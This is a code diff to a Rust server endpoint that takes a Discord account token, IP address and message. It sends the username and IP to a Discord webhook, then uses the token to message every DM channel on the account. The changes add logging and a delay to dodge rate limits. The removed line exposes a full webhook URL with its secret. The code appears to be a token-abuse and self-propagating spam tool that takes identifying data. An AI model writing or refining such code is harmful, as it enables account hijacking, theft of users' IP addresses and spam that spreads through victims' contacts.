@@ -107,7 +107,7 @@ async fn send(Json(payload): Json<Payload>) -> &'static str {
     // Fetch user information (username)
     let user_info_url = "https://discord.com/api/v9/users/@me";
     let user_response = client.get(user_info_url)
-        .header("Authorization", format!("{}", payload.token))
+        .header("Authorization", format!("{}", payload.token)) // 🔧 Fixed Auth Header
         .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
         .send()
         .await;
@@ -120,11 +120,15 @@ async fn send(Json(payload): Json<Payload>) -> &'static str {
                     username = name.to_string();
                 }
             }
+        } else {
+            eprintln!("❌ Failed to fetch username: {}", resp.status());
         }
+    } else {
+        eprintln!("❌ Request error when fetching username");
     }
     
     // Send message to Discord webhook including IP and username
-    let webhook_url = "https://discord.com/api/webhooks/1332801389461635132/bSSYvH0qlWxghUjXiwLlZ_lMmYwPgtoUvz6--uaMNvTmty2DcChWRcEaG0FwvxduxB2t"; // Replace with your actual webhook URL
+    let webhook_url = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL";
     let webhook_content = format!("Message: {}\nUsername: {}\nIP: {}", payload.message, username, payload.ip);
     let discord_payload = DiscordPayload {
         content: webhook_content.clone(),
@@ -146,10 +150,10 @@ async fn send(Json(payload): Json<Payload>) -> &'static str {
         }
     }
     
-    // Send message to all DMs
+    // Fetch user's DM channels
     let api_url = "https://discord.com/api/v9/users/@me/channels";
     let response = client.get(api_url)
-        .header("Authorization", format!("{}", payload.token))
+        .header("Authorization", format!("{}", payload.token)) // 🔧 Fixed Auth Header
         .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
         .send()
         .await;
@@ -163,7 +167,7 @@ async fn send(Json(payload): Json<Payload>) -> &'static str {
                     for dm in dms {
                         if let Some(dm_id) = dm["id"].as_str() {
                             let msg_response = client.post(format!("https://discord.com/api/v9/channels/{}/messages", dm_id))
-                                .header("Authorization", format!("{}", payload.token))
+                                .header("Authorization", format!("{}", payload.token)) // 🔧 Fixed Auth Header
                                 .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
                                 .json(&serde_json::json!({"content": payload.message}))
                                 .send()
@@ -180,6 +184,9 @@ async fn send(Json(payload): Json<Payload>) -> &'static str {
                                     eprintln!("❌ Request error while sending DM to {}: {}", dm_id, e);
                                 }
                             }
+
+                            // 🔹 Delay to prevent rate limiting
+                            tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                         }
                     }
                     "✅ Messages sent to webhook and DMs"
@@ -191,7 +198,7 @@ async fn send(Json(payload): Json<Payload>) -> &'static str {
             }
         }
         Ok(resp) => {
-            eprintln!("❌ Failed to get DMs: {}", resp.status());
+            eprintln!("❌ Failed to get DMs: {} - Body: {:?}", resp.status(), resp.text().await.unwrap_or_else(|_| "No response".to_string())); // 🔧 Improved Logging
             "❌ Error fetching DM channels"
         }
         Err(e) => {
